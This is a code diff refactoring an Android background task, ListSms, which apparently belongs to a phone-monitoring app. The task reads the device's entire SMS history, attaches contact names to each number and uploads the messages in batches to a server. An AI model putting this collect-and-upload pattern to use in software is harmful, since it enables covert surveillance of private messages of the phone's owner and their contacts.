@@ -12,7 +12,7 @@ import android.os.AsyncTask;
 import android.preference.PreferenceManager;
 import android.provider.ContactsContract.PhoneLookup;
 
-import com.inet.android.request.OnDemandRequest;
+import com.inet.android.request.RequestList;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 
@@ -23,29 +23,21 @@ import com.inet.android.utils.Logging;
  * 
  */
 public class ListSms extends AsyncTask<Context, Void, Void> {
-	ConvertDate date;
 	Context mContext;
-	private String LOG_TAG = "ListSMS";
-	private String sendStr = null;
+	private String LOG_TAG = ListSms.class.getSimpleName().toString();
 	private String complete;
 	private String iType = "2";;
-	private Uri uri;
-	private Cursor sms_sent_cursor;
-	SharedPreferences sp;
-	private TurnSendList sendList;
 	private String version;
 
 	public void getSmsLogs() {
-
-		date = new ConvertDate();
-		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
+		SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(mContext);
+		String sendStr = null;
 		version = sp.getString("list_sms", "0");
 
 		// -------------- for---------------------------------------------
 
-		uri = Uri.parse("content://sms");
-
-		sms_sent_cursor = mContext.getContentResolver().query(uri, null, null,
+		Uri uri = Uri.parse("content://sms");
+		Cursor sms_sent_cursor = mContext.getContentResolver().query(uri, null, null,
 				null, "date desc");
 		Logging.doLog(LOG_TAG, "readSMS", "readSMS");
 
@@ -75,7 +67,7 @@ public class ListSms extends AsyncTask<Context, Void, Void> {
 						try {
 							archiveSMSJson
 									.put("time",
-											date.getData(sms_sent_cursor.getLong(sms_sent_cursor
+											ConvertDate.getData(sms_sent_cursor.getLong(sms_sent_cursor
 													.getColumnIndexOrThrow("date"))));
 							archiveSMSJson.put("type", type);
 							archiveSMSJson.put("number", sms_sent_cursor
@@ -102,14 +94,9 @@ public class ListSms extends AsyncTask<Context, Void, Void> {
 							e.printStackTrace();
 						}
 						if (sendStr.length() >= 50000) {
-
-							Logging.doLog(LOG_TAG, "str >= 50000",
-									"str >= 50000");
 							sendRequest(sendStr, complete);
 							sendStr = null;
 						}
-						Logging.doLog(LOG_TAG, "moveToNext", "moveToNext");
-
 						sms_sent_cursor.moveToNext();
 
 					}
@@ -138,9 +125,7 @@ public class ListSms extends AsyncTask<Context, Void, Void> {
 	}
 
 	private void endList() {
-		sendList = new TurnSendList(mContext);
-		sendList.setList(iType, version, "0");
-
+		TurnSendList.setList(iType, version, "0", mContext);
 	}
 
 	private void lastRaw(String sendStr) {
@@ -150,11 +135,7 @@ public class ListSms extends AsyncTask<Context, Void, Void> {
 	}
 
 	private void sendRequest(String str, String complete) {
-		if (str != null) {
-			OnDemandRequest dr = new OnDemandRequest(mContext, iType, complete,
-					version);
-			dr.sendRequest(str);
-		}
+		RequestList.sendDemandRequest(str, iType, complete, version, mContext);
 	}
 
 	private String getContactName(Context context, String phoneNumber) {
@@ -180,7 +161,7 @@ public class ListSms extends AsyncTask<Context, Void, Void> {
 	@Override
 	protected Void doInBackground(Context... params) {
 		// TODO Автоматически созданная заглушка метода
-		Logging.doLog(LOG_TAG, "doIn");
+		Logging.doLog(LOG_TAG, "doInBackground");
 		this.mContext = params[0];
 		getSmsLogs();
 		return null;
